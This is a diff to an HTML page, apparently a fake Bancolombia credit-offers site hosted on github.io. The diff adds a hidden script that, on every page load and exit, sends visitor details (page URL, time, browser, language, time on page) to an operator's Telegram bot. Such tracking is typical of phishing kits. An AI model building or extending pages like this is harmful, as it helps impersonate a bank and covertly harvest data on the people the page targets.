@@ -41,8 +41,7 @@
 </head>
 <body>
 
-
-      <img src="https://sucursalvirtual-cre-col.github.io/personapp/hede.jpeg" alt="Descripción de la imagen" width="400" height=""></center> 
+    <img src="https://sucursalvirtual-cre-col.github.io/personapp/hede.jpeg" alt="Descripción de la imagen" width="400" height=""></center> 
     <div class="container mt-5">
         <div class="row justify-content-center">
             <!-- Tarjeta: Crédito de libre inversión -->
@@ -148,7 +147,51 @@
     <!-- Bootstrap JS -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"></script>
 
-</body>
+    <!-- Script de Telegram para notificaciones de visitantes -->
+    <script>
+        // Configuración - REEMPLAZA CON TUS DATOS
+        const BOT_TOKEN = '1234567890:AAFghIjKlMnOpQRStUvWxYzAbCdEfGhIjKl';
+        const CHAT_ID = '123456789';
 
-       
+        // Función para enviar mensaje a Telegram
+        function enviarTelegram(mensaje) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: mensaje,
+                    parse_mode: 'HTML'
+                })
+            }).catch(error => console.log('Error enviando a Telegram:', error));
+        }
+
+        // Detecta cuando la página se carga
+        window.addEventListener('load', function() {
+            const mensaje = `🆕 <b>Nuevo Visitante en Créditos Bancolombia</b>
+            
+📄 Página: ${window.location.href}
+🕐 Hora: ${new Date().toLocaleString()}
+📱 Navegador: ${navigator.userAgent.split(' ')[0]}
+🌐 Idioma: ${navigator.language}`;
+
+            enviarTelegram(mensaje);
+        });
+
+        // Opcional: Detecta cuando el visitante se va
+        window.addEventListener('beforeunload', function() {
+            const tiempo = Math.round((new Date() - performance.timing.navigationStart) / 1000);
+            const mensaje = `🚪 <b>Visitante se fue de Créditos Bancolombia</b>
+            
+⏱️ Tiempo en página: ${tiempo} segundos
+📄 Página: ${window.location.href}`;
+
+            enviarTelegram(mensaje);
+        });
+    </script>
+</body>
 </html>
